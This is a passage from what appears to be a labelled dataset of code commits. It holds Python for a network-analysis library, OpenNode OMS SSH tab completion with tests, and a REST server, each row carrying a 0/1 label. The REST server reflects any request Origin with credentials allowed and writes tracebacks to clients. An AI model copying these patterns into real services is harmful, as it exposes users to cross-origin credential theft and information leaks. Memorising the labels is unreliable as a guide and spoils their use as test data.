                prob = count / D[self.nodes.index(s)]
                if prob < 0 or prob > 1:
                    tn.Log.add('Encountered transition probability outside [0,1] range.', Severity.ERROR)
                    raise ValueError()
                data.append(prob)

        data = _np.array(data)
        data = data.reshape(data.size,)

        return _sparse.coo_matrix((data, (row, col)), shape=(self.vcount(), self.vcount())).tocsr()


    @staticmethod
    def getLeadingEigenvector(A, normalized=True, lanczosVecs=15, maxiter=1000):
        """"""Compute normalized leading eigenvector of a given matrix A.

        @param A: sparse matrix for which leading eigenvector will be computed
        @param normalized: wheter or not to normalize. Default is C{True}
        @param lanczosVecs: number of Lanczos vectors to be used in the approximate
            calculation of eigenvectors and eigenvalues. This maps to the ncv parameter
            of scipy's underlying function eigs.
        @param maxiter: scaling factor for the number of iterations to be used in the
            approximate calculation of eigenvectors and eigenvalues. The number of iterations
            passed to scipy's underlying eigs function will be n*maxiter where n is the
            number of rows/columns of the Laplacian matrix.
        """"""

        if _sparse.issparse(A) == False:
            raise TypeError(""A must be a sparse matrix"")

        # NOTE: ncv sets additional auxiliary eigenvectors that are computed
        # NOTE: in order to be more confident to find the one with the largest
        # NOTE: magnitude, see https://github.com/scipy/scipy/issues/4987
        w, pi = _sla.eigs(A, k=1, which=""LM"", ncv=lanczosVecs, maxiter=maxiter)
        pi = pi.reshape(pi.size,)
        if normalized:
            pi /= sum(pi)
        return pi


    def getLaplacianMatrix(self, includeSubPaths=True):
        """"""
        Returns the transposed Laplacian matrix corresponding to the higher-order network.

        @param includeSubpaths: Whether or not subpath statistics shall be included in the
            calculation of matrix weights
        """"""

        T = self.getTransitionMatrix(includeSubPaths)
        I = _sparse.identity(self.vcount())

        return I-T
/n/n/n",1
164,0a87ba7972cdcab6ce77568e8d0eb8474132315d,"opennode/oms/endpoint/ssh/completion_cmds.py/n/nfrom grokcore.component import baseclass, context
from zope.component import provideSubscriptionAdapter
import argparse
import os

from opennode.oms.endpoint.ssh import cmd
from opennode.oms.endpoint.ssh.completion import Completer
from opennode.oms.endpoint.ssh.cmdline import GroupDictAction
from opennode.oms.model.model.base import IContainer
from opennode.oms.model.model import creatable_models
from opennode.oms.zodb import db


class CommandCompleter(Completer):
    """"""Completes a command.""""""

    context(cmd.NoCommand)

    def complete(self, token, parsed, parser):
        return [name for name in cmd.commands().keys() if name.startswith(token)]


class PathCompleter(Completer):
    """"""Completes a path name.""""""
    baseclass()

    @db.transact
    def complete(self, token, parsed, parser):
        if not self.consumed(parsed, parser):
            base_path = os.path.dirname(token)
            container = self.context.traverse(base_path)

            if IContainer.providedBy(container):
                def dir_suffix(obj):
                    return '/' if IContainer.providedBy(obj) else ''

                def name(obj):
                    return os.path.join(base_path, obj.__name__)

                return [name(obj) + dir_suffix(obj) for obj in container.listcontent() if name(obj).startswith(token)]


        return []

    def consumed(self, parsed, parser):
        """"""Check whether we have already consumed all positional arguments.""""""

        maximum = 0
        actual = 0
        for action_group in parser._action_groups:
            for action in action_group._group_actions:
                # For every positional argument:
                if not action.option_strings:
                    # Count how many of them we have already.
                    values = getattr(parsed, action.dest, [])
                    if values == action.default:  # don't count default values
                        values = []
                    if not isinstance(values, list):
                        values = [values]
                    actual += len(values)

                    # And the maximum number of expected occurencies.
                    if isinstance(action.nargs, int):
                        maximum += action.nargs
                    if action.nargs == argparse.OPTIONAL:
                        maximum += 1
                    else:
                        maximum = float('inf')

        return actual >= maximum


class ArgSwitchCompleter(Completer):
    """"""Completes argument switches based on the argparse grammar exposed for a command""""""
    baseclass()

    def complete(self, token, parsed, parser):
        if token.startswith(""-""):
            parser = self.context.arg_parser(partial=True)

            options = [option
                       for action_group in parser._action_groups
                       for action in action_group._group_actions
                       for option in action.option_strings
                       if option.startswith(token) and not self.option_consumed(action, parsed)]
            return options
        else:
            return []

    def option_consumed(self, action, parsed):
        # ""count"" actions can be repeated
        if action.nargs > 0 or isinstance(action, argparse._CountAction):
            return False

        if isinstance(action, GroupDictAction):
            value = getattr(parsed, action.group, {}).get(action.dest, action.default)
        else:
            value = getattr(parsed, action.dest, action.default)

        return value != action.default

class KeywordSwitchCompleter(ArgSwitchCompleter):
    """"""Completes key=value argument switches based on the argparse grammar exposed for a command.
    TODO: probably more can be shared with ArgSwitchCompleter.""""""

    baseclass()

    def complete(self, token, parsed, parser):
        options = [option[1:] + '='
                   for action_group in parser._action_groups
                   for action in action_group._group_actions
                   for option in action.option_strings
                   if option.startswith('=' + token) and not self.option_consumed(action, parsed)]
        return options


class KeywordValueCompleter(ArgSwitchCompleter):
    """"""Completes the `value` part of key=value constructs based on the type of the keyword.
    Currently works only for args which declare an explicit enumeration.""""""

    baseclass()

    def complete(self, token, parsed, parser):
        if '=' in token:
            keyword, value_prefix = token.split('=')

            action = self.find_action(keyword, parsed, parser)
            if action.choices:
                return [keyword + '=' + value for value in action.choices if value.startswith(value_prefix)]

        return []

    def find_action(self, keyword, parsed, parser):
        for action_group in parser._action_groups:
            for action in action_group._group_actions:
                if action.dest == keyword:
                    return action


class ObjectTypeCompleter(Completer):
    """"""Completes object type names.""""""

    context(cmd.cmd_mk)

    def complete(self, token):
        return [name for name in creatable_models.keys() if name.startswith(token)]


# TODO: move to handler
for command in [cmd.cmd_ls, cmd.cmd_cd, cmd.cmd_cat, cmd.cmd_set]:
    provideSubscriptionAdapter(PathCompleter, adapts=[command])

for command in [cmd.cmd_ls, cmd.cmd_cd, cmd.cmd_cat, cmd.cmd_set, cmd.cmd_quit]:
    provideSubscriptionAdapter(ArgSwitchCompleter, adapts=[command])

for command in [cmd.cmd_set]:
    provideSubscriptionAdapter(KeywordSwitchCompleter, adapts=[command])

for command in [cmd.cmd_set]:
    provideSubscriptionAdapter(KeywordValueCompleter, adapts=[command])
/n/n/nopennode/oms/endpoint/ssh/protocol.py/n/nimport os

from columnize import columnize
from twisted.internet import defer

from opennode.oms.endpoint.ssh import cmd, completion, cmdline
from opennode.oms.endpoint.ssh.terminal import InteractiveTerminal
from opennode.oms.endpoint.ssh.tokenizer import CommandLineTokenizer, CommandLineSyntaxError
from opennode.oms.zodb import db


class OmsSshProtocol(InteractiveTerminal):
    """"""The OMS virtual console over SSH.

    Accepts lines of input and writes them back to its connection.  If
    a line consisting solely of ""quit"" is received, the connection
    is dropped.

    """"""

    def __init__(self):
        super(OmsSshProtocol, self).__init__()
        self.path = ['']

        @defer.inlineCallbacks
        def _get_obj_path():
            # Here, we simply hope that self.obj_path won't actually be
            # used until it's initialised.  A more fool-proof solution
            # would be to block everything in the protocol while the ZODB
            # query is processing, but that would require a more complex
            # workaround.  This will not be a problem during testing as
            # DB access is blocking when testing.
            self.obj_path = yield db.transact(lambda: [db.ref(db.get_root()['oms_root'])])()

        _get_obj_path()

        self.tokenizer = CommandLineTokenizer()

    def lineReceived(self, line):
        line = line.strip()

        try:
            command, cmd_args = self.parse_line(line)
        except CommandLineSyntaxError as e:
            self.terminal.write(""Syntax error: %s\n"" % (e.message))
            self.print_prompt()
            return

        deferred = defer.maybeDeferred(command, *cmd_args)

        @deferred
        def on_success(ret):
            self.print_prompt()

        @deferred
        def on_error(f):
            if not f.check(cmdline.ArgumentParsingError):
                f.raiseException()
            self.print_prompt()

        ret = defer.Deferred()
        deferred.addBoth(ret.callback)
        return ret

    def print_prompt(self):
        self.terminal.write(self.ps[self.pn])

    def insert_buffer(self, buf):
        """"""Inserts some chars in the buffer at the current cursor position.""""""
        lead, rest = self.lineBuffer[0:self.lineBufferIndex], self.lineBuffer[self.lineBufferIndex:]
        self.lineBuffer = lead + buf + rest
        self.lineBufferIndex += len(buf)

    def insert_text(self, text):
        """"""Inserts some text at the current cursor position and renders it.""""""
        self.terminal.write(text)
        self.insert_buffer(list(text))

    def parse_line(self, line):
        """"""Returns a command instance and parsed cmdline argument list.

        TODO: Shell expansion should be handled here.

        """"""

        cmd_name, cmd_args = line.partition(' ')[::2]
        command_cls = cmd.get_command(cmd_name)

        tokenized_cmd_args = self.tokenizer.tokenize(cmd_args.strip())

        return command_cls(self), tokenized_cmd_args

    @defer.inlineCallbacks
    def handle_TAB(self):
        """"""Handles tab completion.""""""
        partial, rest, completions = yield completion.complete(self, self.lineBuffer, self.lineBufferIndex)

        if len(completions) == 1:
            space = '' if rest else ' '
            # handle quote closing
            if self.lineBuffer[self.lineBufferIndex - len(partial) - 1] == '""':
                space = '"" '
            # Avoid space after '=' just for aestetics.
            # Avoid space after '/' for functionality.
            for i in ('=', '/'):
                if completions[0].endswith(i):
                    space = ''

            patch = completions[0][len(partial):] + space
            self.insert_text(patch)
        elif len(completions) > 1:
            common_prefix = os.path.commonprefix(completions)
            patch = common_prefix[len(partial):]
            self.insert_text(patch)

            # postpone showing list of possible completions until next tab
            if not patch:
                self.terminal.nextLine()
                self.terminal.write(columnize(completions))
                self.drawInputLine()
                if len(rest):
                    self.terminal.cursorBackward(len(rest))


    @property
    def hist_file_name(self):
        return os.path.expanduser('~/.oms_history')

    @property
    def ps(self):
        ps1 = '%s@%s:%s%s ' % ('user', 'oms', self._cwd(), '#')
        return [ps1, '... ']

    def _cwd(self):
        return self.make_path(self.path)

    @staticmethod
    def make_path(path):
        return '/'.join(path) or '/'
/n/n/nopennode/oms/tests/test_completion.py/n/nimport unittest

import mock
from nose.tools import eq_

from opennode.oms.endpoint.ssh.protocol import OmsSshProtocol
from opennode.oms.endpoint.ssh import cmd


class CmdCompletionTestCase(unittest.TestCase):

    def setUp(self):
        self.oms_ssh = OmsSshProtocol()
        self.terminal = mock.Mock()
        self.oms_ssh.terminal = self.terminal

        self.oms_ssh.connectionMade()

        # the standard model doesn't have any command or path which
        # is a prefix of another (len > 1), I don't want to force changes
        # to the model just for testing completion, so we have monkey patch
        # the commands() function and add a command 'hello'.
        self.orig_commands = cmd.commands
        cmd.commands = lambda: dict(hello=cmd.Cmd, **self.orig_commands())

    def tearDown(self):
        cmd.commands = self.orig_commands

    def _input(self, string):
        for s in string:
            self.oms_ssh.characterReceived(s, False)

    def _tab_after(self, string):
        self._input(string)
        self.terminal.reset_mock()

        self.oms_ssh.handle_TAB()

    def test_command_completion(self):
        self._tab_after('s')
        eq_(self.terminal.method_calls, [('write', ('et ',), {})])

    def test_command_completion_spaces(self):
        self._tab_after('    s')
        eq_(self.terminal.method_calls, [('write', ('et ',), {})])

    def test_complete_not_found(self):
        self._tab_after('t')
        eq_(len(self.terminal.method_calls), 0)

    def test_complete_quotes(self):
        self._tab_after('ls ""comp')
        eq_(self.terminal.method_calls, [('write', ('utes/',), {})])

    def test_complete_prefix(self):
        self._tab_after('h')
        eq_(self.terminal.method_calls, [('write', ('el',), {})])

        # hit tab twice
        self.terminal.reset_mock()
        self.oms_ssh.handle_TAB()

        eq_(self.terminal.method_calls, [('write', ('',), {}), ('nextLine', (), {}), ('write', ('help  hello\n',), {}), ('write', (self.oms_ssh.ps[0] + 'hel',), {})])

    def test_spaces_between_arg(self):
        self._tab_after('ls comp')
        eq_(self.terminal.method_calls, [('write', ('utes/',), {})])

    def test_command_arg_spaces_before_command(self):
        self._tab_after(' ls comp')
        eq_(self.terminal.method_calls, [('write', ('utes/',), {})])

    def test_mandatory_positional(self):
        self._tab_after('cat ')
        eq_(len(self.terminal.method_calls), 4)

    def test_complete_switches(self):
        self._tab_after('quit ')
        eq_(len(self.terminal.method_calls), 0)

        # hit tab twice
        self.oms_ssh.handle_TAB()
        eq_(len(self.terminal.method_calls), 0)

        # now try with a dash
        self._tab_after('-')
        eq_(self.terminal.method_calls, [('write', ('',), {}), ('nextLine', (), {}), ('write', ('-h  --help\n',), {}), ('write', (self.oms_ssh.ps[0] + 'quit -',), {})])
        # disambiguate
        self._tab_after('-')
        eq_(self.terminal.method_calls, [('write', ('help ',), {})])

    def test_complete_consumed_switches(self):
        self._tab_after('ls --help')
        eq_(self.terminal.method_calls, [('write', (' ',), {})])

        self._tab_after('-')
        assert 'help' not in self.terminal.method_calls[2][1][0]
        assert '-h' not in self.terminal.method_calls[2][1][0]
/n/n/n",0
165,0a87ba7972cdcab6ce77568e8d0eb8474132315d,"/opennode/oms/endpoint/ssh/completion_cmds.py/n/nfrom grokcore.component import baseclass, context
from zope.component import provideSubscriptionAdapter
import argparse

from opennode.oms.endpoint.ssh import cmd
from opennode.oms.endpoint.ssh.completion import Completer
from opennode.oms.endpoint.ssh.cmdline import GroupDictAction
from opennode.oms.model.model.base import IContainer
from opennode.oms.model.model import creatable_models
from opennode.oms.zodb import db


class CommandCompleter(Completer):
    """"""Completes a command.""""""

    context(cmd.NoCommand)

    def complete(self, token, parsed, parser):
        return [name for name in cmd.commands().keys() if name.startswith(token)]


class PathCompleter(Completer):
    """"""Completes a path name.""""""
    baseclass()

    @db.transact
    def complete(self, token, parsed, parser):

        if not self.consumed(parsed, parser):
            obj = self.context.current_obj
            if IContainer.providedBy(obj):
                return [name for name in obj.listnames() if name.startswith(token)]

        return []

    def consumed(self, parsed, parser):
        """"""Check whether we have already consumed all positional arguments.""""""

        maximum = 0
        actual = 0
        for action_group in parser._action_groups:
            for action in action_group._group_actions:
                # For every positional argument:
                if not action.option_strings:
                    # Count how many of them we have already.
                    values = getattr(parsed, action.dest, [])
                    if values == action.default:  # don't count default values
                        values = []
                    if not isinstance(values, list):
                        values = [values]
                    actual += len(values)

                    # And the maximum number of expected occurencies.
                    if isinstance(action.nargs, int):
                        maximum += action.nargs
                    if action.nargs == argparse.OPTIONAL:
                        maximum += 1
                    else:
                        maximum = float('inf')

        return actual >= maximum


class ArgSwitchCompleter(Completer):
    """"""Completes argument switches based on the argparse grammar exposed for a command""""""
    baseclass()

    def complete(self, token, parsed, parser):
        if token.startswith(""-""):
            parser = self.context.arg_parser(partial=True)

            options = [option
                       for action_group in parser._action_groups
                       for action in action_group._group_actions
                       for option in action.option_strings
                       if option.startswith(token) and not self.option_consumed(action, parsed)]
            return options
        else:
            return []

    def option_consumed(self, action, parsed):
        # ""count"" actions can be repeated
        if action.nargs > 0 or isinstance(action, argparse._CountAction):
            return False

        if isinstance(action, GroupDictAction):
            value = getattr(parsed, action.group, {}).get(action.dest, action.default)
        else:
            value = getattr(parsed, action.dest, action.default)

        return value != action.default

class KeywordSwitchCompleter(ArgSwitchCompleter):
    """"""Completes key=value argument switches based on the argparse grammar exposed for a command.
    TODO: probably more can be shared with ArgSwitchCompleter.""""""

    baseclass()

    def complete(self, token, parsed, parser):
        options = [option[1:] + '='
                   for action_group in parser._action_groups
                   for action in action_group._group_actions
                   for option in action.option_strings
                   if option.startswith('=' + token) and not self.option_consumed(action, parsed)]
        return options


class KeywordValueCompleter(ArgSwitchCompleter):
    """"""Completes the `value` part of key=value constructs based on the type of the keyword.
    Currently works only for args which declare an explicit enumeration.""""""

    baseclass()

    def complete(self, token, parsed, parser):
        if '=' in token:
            keyword, value_prefix = token.split('=')

            action = self.find_action(keyword, parsed, parser)
            if action.choices:
                return [keyword + '=' + value for value in action.choices if value.startswith(value_prefix)]

        return []

    def find_action(self, keyword, parsed, parser):
        for action_group in parser._action_groups:
            for action in action_group._group_actions:
                if action.dest == keyword:
                    return action


class ObjectTypeCompleter(Completer):
    """"""Completes object type names.""""""

    context(cmd.cmd_mk)

    def complete(self, token):
        return [name for name in creatable_models.keys() if name.startswith(token)]


# TODO: move to handler
for command in [cmd.cmd_ls, cmd.cmd_cd, cmd.cmd_cat, cmd.cmd_set]:
    provideSubscriptionAdapter(PathCompleter, adapts=[command])

for command in [cmd.cmd_ls, cmd.cmd_cd, cmd.cmd_cat, cmd.cmd_set, cmd.cmd_quit]:
    provideSubscriptionAdapter(ArgSwitchCompleter, adapts=[command])

for command in [cmd.cmd_set]:
    provideSubscriptionAdapter(KeywordSwitchCompleter, adapts=[command])

for command in [cmd.cmd_set]:
    provideSubscriptionAdapter(KeywordValueCompleter, adapts=[command])
/n/n/n/opennode/oms/endpoint/ssh/protocol.py/n/nimport os

from columnize import columnize
from twisted.internet import defer

from opennode.oms.endpoint.ssh import cmd, completion, cmdline
from opennode.oms.endpoint.ssh.terminal import InteractiveTerminal
from opennode.oms.endpoint.ssh.tokenizer import CommandLineTokenizer, CommandLineSyntaxError
from opennode.oms.zodb import db


class OmsSshProtocol(InteractiveTerminal):
    """"""The OMS virtual console over SSH.

    Accepts lines of input and writes them back to its connection.  If
    a line consisting solely of ""quit"" is received, the connection
    is dropped.

    """"""

    def __init__(self):
        super(OmsSshProtocol, self).__init__()
        self.path = ['']

        @defer.inlineCallbacks
        def _get_obj_path():
            # Here, we simply hope that self.obj_path won't actually be
            # used until it's initialised.  A more fool-proof solution
            # would be to block everything in the protocol while the ZODB
            # query is processing, but that would require a more complex
            # workaround.  This will not be a problem during testing as
            # DB access is blocking when testing.
            self.obj_path = yield db.transact(lambda: [db.ref(db.get_root()['oms_root'])])()

        _get_obj_path()

        self.tokenizer = CommandLineTokenizer()

    def lineReceived(self, line):
        line = line.strip()

        try:
            command, cmd_args = self.parse_line(line)
        except CommandLineSyntaxError as e:
            self.terminal.write(""Syntax error: %s\n"" % (e.message))
            self.print_prompt()
            return

        deferred = defer.maybeDeferred(command, *cmd_args)

        @deferred
        def on_success(ret):
            self.print_prompt()

        @deferred
        def on_error(f):
            if not f.check(cmdline.ArgumentParsingError):
                f.raiseException()
            self.print_prompt()

        ret = defer.Deferred()
        deferred.addBoth(ret.callback)
        return ret

    def print_prompt(self):
        self.terminal.write(self.ps[self.pn])

    def insert_buffer(self, buf):
        """"""Inserts some chars in the buffer at the current cursor position.""""""
        lead, rest = self.lineBuffer[0:self.lineBufferIndex], self.lineBuffer[self.lineBufferIndex:]
        self.lineBuffer = lead + buf + rest
        self.lineBufferIndex += len(buf)

    def insert_text(self, text):
        """"""Inserts some text at the current cursor position and renders it.""""""
        self.terminal.write(text)
        self.insert_buffer(list(text))

    def parse_line(self, line):
        """"""Returns a command instance and parsed cmdline argument list.

        TODO: Shell expansion should be handled here.

        """"""

        cmd_name, cmd_args = line.partition(' ')[::2]
        command_cls = cmd.get_command(cmd_name)

        tokenized_cmd_args = self.tokenizer.tokenize(cmd_args.strip())

        return command_cls(self), tokenized_cmd_args

    @defer.inlineCallbacks
    def handle_TAB(self):
        """"""Handles tab completion.""""""
        partial, rest, completions = yield completion.complete(self, self.lineBuffer, self.lineBufferIndex)

        if len(completions) == 1:
            space = '' if rest else ' '
            # handle quote closing
            if self.lineBuffer[self.lineBufferIndex - len(partial) - 1] == '""':
                space = '"" '
            # Avoid space after '=' just for aestetics.
            if completions[0].endswith('='):
                space = ''

            patch = completions[0][len(partial):] + space
            self.insert_text(patch)
        elif len(completions) > 1:
            common_prefix = os.path.commonprefix(completions)
            patch = common_prefix[len(partial):]
            self.insert_text(patch)

            # postpone showing list of possible completions until next tab
            if not patch:
                self.terminal.nextLine()
                self.terminal.write(columnize(completions))
                self.drawInputLine()
                if len(rest):
                    self.terminal.cursorBackward(len(rest))


    @property
    def hist_file_name(self):
        return os.path.expanduser('~/.oms_history')

    @property
    def ps(self):
        ps1 = '%s@%s:%s%s ' % ('user', 'oms', self._cwd(), '#')
        return [ps1, '... ']

    def _cwd(self):
        return self.make_path(self.path)

    @staticmethod
    def make_path(path):
        return '/'.join(path) or '/'
/n/n/n/opennode/oms/tests/test_completion.py/n/nimport unittest

import mock
from nose.tools import eq_

from opennode.oms.endpoint.ssh.protocol import OmsSshProtocol
from opennode.oms.endpoint.ssh import cmd


class CmdCompletionTestCase(unittest.TestCase):

    def setUp(self):
        self.oms_ssh = OmsSshProtocol()
        self.terminal = mock.Mock()
        self.oms_ssh.terminal = self.terminal

        self.oms_ssh.connectionMade()

        # the standard model doesn't have any command or path which
        # is a prefix of another (len > 1), I don't want to force changes
        # to the model just for testing completion, so we have monkey patch
        # the commands() function and add a command 'hello'.
        self.orig_commands = cmd.commands
        cmd.commands = lambda: dict(hello=cmd.Cmd, **self.orig_commands())

    def tearDown(self):
        cmd.commands = self.orig_commands

    def _input(self, string):
        for s in string:
            self.oms_ssh.characterReceived(s, False)

    def _tab_after(self, string):
        self._input(string)
        self.terminal.reset_mock()

        self.oms_ssh.handle_TAB()

    def test_command_completion(self):
        self._tab_after('s')
        eq_(self.terminal.method_calls, [('write', ('et ',), {})])

    def test_command_completion_spaces(self):
        self._tab_after('    s')
        eq_(self.terminal.method_calls, [('write', ('et ',), {})])

    def test_complete_not_found(self):
        self._tab_after('t')
        eq_(len(self.terminal.method_calls), 0)

    def test_complete_quotes(self):
        self._tab_after('ls ""comp')
        eq_(self.terminal.method_calls, [('write', ('utes"" ',), {})])

    def test_complete_prefix(self):
        self._tab_after('h')
        eq_(self.terminal.method_calls, [('write', ('el',), {})])

        # hit tab twice
        self.terminal.reset_mock()
        self.oms_ssh.handle_TAB()

        eq_(self.terminal.method_calls, [('write', ('',), {}), ('nextLine', (), {}), ('write', ('help  hello\n',), {}), ('write', (self.oms_ssh.ps[0] + 'hel',), {})])

    def test_spaces_between_arg(self):
        self._tab_after('ls comp')
        eq_(self.terminal.method_calls, [('write', ('utes ',), {})])

    def test_command_arg_spaces_before_command(self):
        self._tab_after(' ls comp')
        eq_(self.terminal.method_calls, [('write', ('utes ',), {})])

    def test_mandatory_positional(self):
        self._tab_after('cat ')
        eq_(len(self.terminal.method_calls), 4)

    def test_complete_switches(self):
        self._tab_after('quit ')
        eq_(len(self.terminal.method_calls), 0)

        # hit tab twice
        self.oms_ssh.handle_TAB()
        eq_(len(self.terminal.method_calls), 0)

        # now try with a dash
        self._tab_after('-')
        eq_(self.terminal.method_calls, [('write', ('',), {}), ('nextLine', (), {}), ('write', ('-h  --help\n',), {}), ('write', (self.oms_ssh.ps[0] + 'quit -',), {})])
        # disambiguate
        self._tab_after('-')
        eq_(self.terminal.method_calls, [('write', ('help ',), {})])

    def test_complete_consumed_switches(self):
        self._tab_after('ls --help')
        eq_(self.terminal.method_calls, [('write', (' ',), {})])

        self._tab_after('-')
        assert 'help' not in self.terminal.method_calls[2][1][0]
        assert '-h' not in self.terminal.method_calls[2][1][0]
/n/n/n",1
166,fb7d11509cd93463ac3ce9178b97910a8be1b05d,"opennode/oms/endpoint/httprest/base.py/n/nfrom grokcore.component import Adapter, implements, baseclass
from grokcore.security import require
from zope.interface import Interface


class IHttpRestView(Interface):
    def render(request):
        pass

    def render_recursive(request, depth):
        pass

    def rw_transaction(request):
        """"""Return true if we this request should be committed""""""


class IHttpRestSubViewFactory(Interface):
    def resolve(path, method):
        """"""Resolve a view for a given sub path""""""


class HttpRestView(Adapter):
    implements(IHttpRestView)
    baseclass()
    require('rest')

    __builtin_attributes__ = ['id', 'children']

    def filter_attributes(self, request, data):
        """"""Handle the filtering of attributes according to the 'attrs' parameter in the request""""""
        attrs = request.args.get('attrs', [''])[0]
        if attrs:
            filtered_data = {}
            for a in attrs.decode('utf-8').split(',') + self.__builtin_attributes__:
                if a in data:
                    filtered_data[a] = data[a]
            return filtered_data
        return data

    def render_recursive(self, request, depth):
        for method in ('render_' + request.method, 'render'):
            if hasattr(self, method):
                return self.filter_attributes(request, getattr(self, method)(request))
        raise NotImplemented(""method %s not implemented\n"" % request.method)

    def render_OPTIONS(self, request):
        all_methods = ['GET', 'POST', 'PUT', 'DELETE', 'HEAD']
        has_methods = [m for m in all_methods if hasattr(self, 'render_%s' % m)] + ['OPTIONS']
        request.setHeader('Allow', ', '.join(has_methods))

        from opennode.oms.endpoint.httprest.root import EmptyResponse
        return EmptyResponse

    def rw_transaction(self, request):
        return request.method != 'GET'
/n/n/nopennode/oms/endpoint/httprest/root.py/n/nimport json
import functools
import zope.security.interfaces

from twisted.internet import defer
from twisted.python import log, failure
from twisted.web import resource
from twisted.web.server import NOT_DONE_YET
from zope.component import queryAdapter, getUtility

from opennode.oms.config import get_config
from opennode.oms.endpoint.httprest.base import IHttpRestView, IHttpRestSubViewFactory
from opennode.oms.model.traversal import traverse_path
from opennode.oms.security.checker import proxy_factory
from opennode.oms.security.interaction import new_interaction
from opennode.oms.util import blocking_yield
from opennode.oms.zodb import db


class EmptyResponse(Exception):
    pass


class HttpStatus(Exception):
    def __init__(self, body=None, *args, **kwargs):
        super(HttpStatus, self).__init__(*args, **kwargs)
        self.body = body

    @property
    def status_code(self):
        raise NotImplementedError

    @property
    def status_description(self):
        raise NotImplementedError

    headers = {}


class NotFound(HttpStatus):
    status_code = 404
    status_description = ""Not Found""


class NotImplemented(HttpStatus):
    status_code = 501
    status_description = ""Not Implemented""


class AbstractRedirect(HttpStatus):
    def __init__(self, url, *args, **kwargs):
        super(AbstractRedirect, self).__init__(*args, **kwargs)
        self.url = url

    @property
    def headers(self):
        return {'Location': self.url}


class SeeCanonical(AbstractRedirect):
    status_code = 301
    status_description = ""Moved Permanently""


class SeeOther(AbstractRedirect):
    status_code = 303
    status_description = ""Moved Temporarily""


class Unauthorized(HttpStatus):
    status_code = 401
    status_description = ""Authorization Required""

    headers = {'WWW-Authenticate': 'Basic realm=OMS',
               'Set-Cookie': 'oms_auth_token=;expires=Wed, 01 Jan 2000 00:00:00 GMT'}


class Forbidden(HttpStatus):
    status_code = 403
    status_description = ""Forbidden""


class BadRequest(HttpStatus):
    status_code = 400
    status_description = ""Bad Request""


class MethodNotAllowed(HttpStatus):
    status_code = 405
    status_description = ""Method not allowed""

    def __init__(self, msg, allow):
        HttpStatus.__init__(self, msg)
        self.headers = {'Allow': ','.join(allow)}


def log_wrapper(self, f, server):
    @functools.wraps(f)
    def log_(request):
        """"""
        Log a request's result to the logfile, by default in combined log format.
        """"""
        if hasattr(request, 'interaction'):
            principals = map(lambda pp: pp.principal.id, request.interaction.participations)
        else:
            principals = []
        if hasattr(self, ""logFile""):
            line = '%s %s - %s ""%s"" %d %s ""%s"" ""%s""\n' % (
                request.getClientIP(),
                principals,
                self._logDateTime,
                '%s %s %s' % (self._escape(request.method),
                              self._escape(request.uri),
                              self._escape(request.clientproto)),
                request.code,
                request.sentLength or ""-"",
                self._escape(request.getHeader(""referer"") or ""-""),
                self._escape(request.getHeader(""user-agent"") or ""-""))
            self.logFile.write(line)
    return log_


class HttpRestServer(resource.Resource):
    """"""Restful HTTP API interface for OMS.

    Exposes a JSON web service to communicate with OMS.

    """"""

    def getChild(self, name, request):
        """"""We are the handler for anything below this base url, except what explicitly added in oms.tac.""""""
        return self

    def __init__(self, avatar=None):
        ## Twisted Resource is a not a new style class, so emulating a super-call
        resource.Resource.__init__(self)
        self.avatar = avatar

        self.use_security_proxy = get_config().getboolean('auth', 'security_proxy_rest')

    def render(self, request):
        request.site.log = log_wrapper(request.site, request.site.log, self)
        deferred = self._render(request)

        @deferred
        def on_error(error):
            log.msg(""Error while rendering http %s"", system='httprest')
            log.err(error, system='httprest')

        return NOT_DONE_YET

    @defer.inlineCallbacks
    def _render(self, request):
        request.setHeader('Content-type', 'application/json')
        origin = request.getHeader('Origin')
        if origin:
            request.setHeader('Access-Control-Allow-Origin', origin)
            request.setHeader('Access-Control-Allow-Credentials', 'true')
        else:
            request.setHeader('Access-Control-Allow-Origin', '*')
        request.setHeader('Access-Control-Allow-Methods', 'GET, PUT, POST, DELETE, OPTIONS, HEAD')
        request.setHeader('Access-Control-Allow-Headers',
                          'Origin, Content-Type, Cache-Control, X-Requested-With')

        ret = None
        try:
            ret = yield self.handle_request(request)
            if ret is EmptyResponse:
                raise ret
        except EmptyResponse:
            pass
        except HttpStatus as exc:
            request.setResponseCode(exc.status_code, exc.status_description)
            for name, value in exc.headers.items():
                request.responseHeaders.addRawHeader(name, value)
            if exc.body:
                request.write(json.dumps(exc.body))
            else:
                request.write(""%s %s\n"" % (exc.status_code, exc.status_description))
            if exc.message:
                request.write(""%s\n"" % exc.message)
        except Exception:
            request.setResponseCode(500, ""Server Error"")
            request.write(""%s %s\n\n"" % (500, ""Server Error""))
            log.err(system='httprest')
            failure.Failure().printTraceback(request)
        else:
            # allow views to take full control of output streaming
            if ret != NOT_DONE_YET:
                def render(obj):
                    if isinstance(obj, set):
                        return list(obj)  # safeguard against dumping sets
                    if hasattr(obj, '__str__'):
                        return str(obj)
                    log.msg(""RENDERING ERROR, cannot json serialize %s"" % obj, system='httprest')
                    raise TypeError

                request.write(json.dumps(ret, indent=2, default=render) + '\n')
        finally:
            if ret != NOT_DONE_YET:
                request.finish()

    def check_auth(self, request):
        from opennode.oms.endpoint.httprest.auth import IHttpRestAuthenticationUtility

        authentication_utility = getUtility(IHttpRestAuthenticationUtility)
        credentials = authentication_utility.get_basic_auth_credentials(request)
        if credentials:
            blocking_yield(authentication_utility.authenticate(request, credentials, basic_auth=True))
            return authentication_utility.generate_token(credentials)
        else:
            return authentication_utility.get_token(request)

    def find_view(self, obj, unresolved_path, method):
        view = queryAdapter(obj, IHttpRestView)

        if len(unresolved_path) == 0:
            return view

        subview_factory = queryAdapter(obj, IHttpRestSubViewFactory)

        subview = subview_factory.resolve(unresolved_path, method) if subview_factory else None

        if not subview:
            raise NotFound

        return subview

    @db.transact
    def handle_request(self, request):
        """"""Takes a request, maps it to a domain object and a
        corresponding IHttpRestView, and returns the rendered output
        of that view.

        """"""
        token = self.check_auth(request)

        oms_root = db.get_root()['oms_root']
        objs, unresolved_path = traverse_path(oms_root, request.path[1:])

        if not objs and unresolved_path:
            objs = [oms_root]

        obj = objs[-1]

        interaction = self.get_interaction(request, token)
        request.interaction = interaction

        if self.use_security_proxy:
            obj = proxy_factory(obj, interaction)

        view = self.find_view(obj, unresolved_path, request.method)

        needs_rw_transaction = view.rw_transaction(request)

        # create a security proxy if we have a secured interaction
        if interaction:
            try:
                view = proxy_factory(view, interaction)
            except:
                # XXX: TODO: define a real exception for this proxy creation error
                # right now we want to ignore security when there are no declared rules
                # on how to secure a view
                pass

        def get_renderer(view, method):
            try:
                return getattr(view, method, None)
            except zope.security.interfaces.Unauthorized:
